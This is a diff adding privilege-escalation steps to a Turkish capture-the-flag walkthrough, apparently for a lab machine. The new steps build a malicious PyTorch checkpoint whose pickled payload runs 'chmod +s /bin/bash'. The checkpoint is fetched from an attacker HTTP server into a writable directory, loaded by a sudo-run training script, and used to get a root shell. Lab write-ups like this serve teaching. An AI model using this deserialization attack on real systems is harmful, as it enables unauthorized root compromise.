@@ -218,6 +218,85 @@ ssh -i id_rsa developer@10.129.177.38
 Sızdırdığımız key ile host makineye (container'ın dışına) **`developer`** kullanıcısı olarak bağlanıyoruz.
 
 
+### 17 — user.txt Flag
+
+```bash
+ls -la
+cat user.txt
+```
+
+![user.txt](images/17.png)
+
+`user.txt` dosyasını okuyarak **user flag'ini** elde ediyoruz.
+
+---
+
+## Privilege Escalation — ML Checkpoint Deserialization
+
+### 18 — Kötücül Checkpoint Payload Hazırlama
+
+```bash
+nano bedside_evil.py
+python3 bedside_evil.py -c "chmod +s /bin/bash" -o checkpoint_epoch_99.pt
+python3 -c "from PIL import Image; Image.new('RGB',(10,10),color='red').save('dummy.png')"
+python3 -m http.server 8080
+```
+
+![evil checkpoint write](images/18.png)
+
+
+PyTorch'un `.pt` formatı, pickle edilmiş veri içeren bir zip arşivi. `bedside_evil.py`, içine `os.system()` çağıran bir `__reduce__` nesnesi gömülü sahte bir checkpoint üretiyor — `torch.load()` ile açıldığında `chmod +s /bin/bash` komutu çalışacak. Gözden kaçırmak için masum bir `dummy.png` de hazırlanıp, ikisi `http.server` ile servis ediliyor.
+
+
+### 19 — Payload'ı datastore Dizinine İndirme
+
+```bash
+ls -la /datastore/
+curl -s -o /datastore/checkpoints/checkpoint_epoch_99.pt http://10.10.15.231:8080/checkpoint_epoch_99.pt
+curl -s -o /datastore/processed/dummy.png http://10.10.15.231:8080/dummy.png
+```
+
+![datastore curl checkpoints](images/19.png)
+
+`datawrangler` kullanıcısının `dataops` grup üyeliği sayesinde `/datastore/checkpoints` ve `/datastore/processed` dizinlerine yazma izni olduğunu görüyoruz. Kendi HTTP sunucumuzdan kötücül checkpoint dosyasını ve sahte görüntüyü doğrudan bu dizinlere indiriyoruz.
+
+
+### 20 — Teslimatı Doğrulama
+
+![http server log](images/20.png)
+
+Kendi `http.server` log'umuzda hedefin (`10.129.177.38`) her iki dosyayı da başarıyla çektiğini (`200 OK`) görüyoruz.
+
+
+### 21 — bedside_trainer.py'yi Tetikleme ve Root Shell
+
+```bash
+sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+```
+
+![trainer root shell](images/21.png)
+
+`developer` kullanıcısının bu scripti **root olarak** çalıştırma yetkisi var (sudo). Script, MONAI/Ignite framework'ü ile `/datastore/checkpoints/checkpoint_epoch_99.pt` dosyasını `CheckpointLoader` (callable mode) üzerinden otomatik yüklüyor. Bu zincir sonunda `torch.load()` çağrısına ulaşıyor ve **pickle deserialize** ediliyor — içine gömdüğümüz `os.system("chmod +s /bin/bash")` **root bağlamında** çalışıyor.
+
+Script hata verip çıktıktan sonra:
+
+```bash
+/bin/bash -p
+```
+
+ile SUID bash üzerinden ayrıcalıklı shell alıyoruz.
+
+
+### 22 — root.txt Flag
+
+```bash
+cat /root/root.txt
+```
+
+![root.txt](images/22.png)
+
+Root flag'i okunuyor — makine tamamlandı.
+
 
 
 
